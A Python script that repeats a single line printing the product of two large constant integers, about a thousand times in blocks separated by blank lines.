print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
